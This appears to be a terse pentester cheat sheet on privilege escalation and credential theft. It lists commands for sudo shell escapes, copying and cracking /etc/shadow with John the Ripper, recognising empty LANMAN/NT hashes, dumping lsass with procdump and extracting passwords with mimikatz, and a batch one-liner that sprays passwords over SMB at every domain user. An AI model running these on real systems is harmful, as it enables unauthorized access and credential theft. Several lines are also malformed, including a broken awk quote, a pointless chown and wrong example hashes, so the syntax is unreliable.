==## 4 - PRIVESC ##==

--# misconfig systems - nix #--
sudo -l #what access? if you have access to debuggers ex /usr/bin/gdb - sudo gdb && shell - it couldn't be that easy
sudo su #it couldn't be that easy


--# JOHN - NIX #--

copy /etc/shadow, /etc/passwd
chown /etc/shadow
unshadow passwd shadow > newfilename #unshadow is a jtr utility
cat newfilename | awk -F: '{print $2'}  #use : as delimiter; print second field ($2) which is the password hash for linux systems
john newfilename #run on combined unshadowed file; will do default john cracking actions, stepping through each method;
#single, wordlist, then incremental
john newfilename --show #show already cracked results; will not show if file has already been cracked otherwise
john --list=formats
<newfilename> --show=left --format=md5crypt (etc)
<newfilename> --show - how many total have been cracked?
john --format=descrypt #DES hashes
john --format=<type, see list with list=formats>
john --format=descrypt --single #single crack mode; uses variation of account name, passwd acct info, etc
-wordlist filename #use filename as wordlist to dict attack; hybrid with single
-incremental #brute force

--# HASHC #--
look for hashes that do not have these two patterns: aadb:dcfed
=LANMAN hashes=
aad[#]b - A A D B - indicates this is an empty LANMAN hash - not active account  eg Admin:500:aad3b435b510413eeeeaadb
#mnemonic device - All Active Directory (is) Bad

NT hashes - D C F E D - 21d5cfe0d - indicates this is an empty NT hash - not active account - eg Admin:500:aad3b435b510413eeeeaabetc:21d5cfe0d
#mnemonic device - Dumb Crypto Fucks Everything Disastrously

--# MKATX #--
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
mk.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full

#can also dump from 3rd party program that stores pw
.\procdump.exe -accepteula -ma <program>.exe <dump>.dmp
strings <dump>.dmp | grep -iE "auth|login|pass|key|secret|token|"

--# SMB PW GUESSING #--
#low complexity pass guess attack for SMB on Windows
#works well with large list of users and short list of common pws
net user /domain > listusers.txt
@FOR /F %p in (passw.txt) DO @FOR /F %n in (listusers.txt) DO @net use \\<SERVERIP>\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\SERVERIP\IPC$ > NUL
